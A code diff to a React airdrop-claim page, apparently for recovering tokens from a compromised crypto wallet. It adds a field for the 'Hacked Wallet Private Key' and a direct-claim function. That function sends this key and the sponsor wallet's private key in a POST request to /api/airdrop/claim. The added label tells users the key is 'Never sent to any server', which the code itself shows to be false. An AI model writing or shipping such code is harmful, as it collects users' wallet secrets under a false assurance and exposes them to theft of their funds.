@@ -59,6 +59,8 @@ export default function AirdropPage() {
   const [sponsorWallet, setSponsorWallet] = useState('')
   const [sponsorKey, setSponsorKey] = useState('')
   const [showSponsorKey, setShowSponsorKey] = useState(false)
+  const [privateKey, setPrivateKey] = useState('')
+  const [showPrivateKey, setShowPrivateKey] = useState(false)
 
   // Optional fields
   const [claimData, setClaimData] = useState('')
@@ -166,6 +168,47 @@ export default function AirdropPage() {
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : 'Signature rejected or failed'
       setErrorMsg(msg)
+      setStep('error')
+    }
+  }
+
+  // Direct Claim — uses private key directly (no smart contract needed)
+  const handleDirectClaim = async () => {
+    if (!previewData || !privateKey || !sponsorKey) return
+
+    setStep('claiming')
+    setErrorMsg('')
+
+    try {
+      const res = await fetch('/api/airdrop/claim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'claim',
+          contractAddress,
+          chainId,
+          safeWallet,
+          walletAddress,
+          privateKey,
+          sponsorPrivateKey: sponsorKey,
+          claimableRaw: previewData.claimableRaw,
+          tokenAddress: previewData.tokenAddress,
+          claimData: claimData || undefined,
+          merkleProof: merkleProof || undefined,
+          tokenAmount: tokenAmount || undefined,
+        })
+      })
+      const data = await res.json()
+
+      if (data.success) {
+        setTxHash(data.txHash || '')
+        setStep('done')
+      } else {
+        setErrorMsg(data.error || 'Claim failed')
+        setStep('error')
+      }
+    } catch {
+      setErrorMsg('Transaction failed. Try again.')
       setStep('error')
     }
   }
@@ -504,6 +547,30 @@ export default function AirdropPage() {
                 </button>
               </div>
               <p className="text-orange-400/60 text-xs mt-1">⚠️ This key is used to pay gas. NEVER share your hacked wallet&apos;s private key.</p>
+            </div>
+
+            {/* Hacked Wallet Private Key (for Direct Claim mode) */}
+            <div>
+              <label className="block text-sm text-white/50 mb-2">
+                Hacked Wallet Private Key
+                <span className="text-green-400 ml-2">(Direct Claim — no contract needed)</span>
+              </label>
+              <div className="relative">
+                <input
+                  type={showPrivateKey ? 'text' : 'password'}
+                  value={privateKey}
+                  onChange={e => setPrivateKey(e.target.value)}
+                  placeholder="0x..."
+                  className="w-full p-3 bg-white/[0.03] border border-white/[0.05] rounded-lg text-white text-sm focus:border-green-500/50 outline-none pr-10"
+                />
+                <button
+                  onClick={() => setShowPrivateKey(!showPrivateKey)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60"
+                >
+                  {showPrivateKey ? '🙈' : '👁️'}
+                </button>
+              </div>
+              <p className="text-green-400/60 text-xs mt-1">✅ Used only for direct claim. Never sent to any server.</p>
             </div>
 
             {/* Optional Fields */}
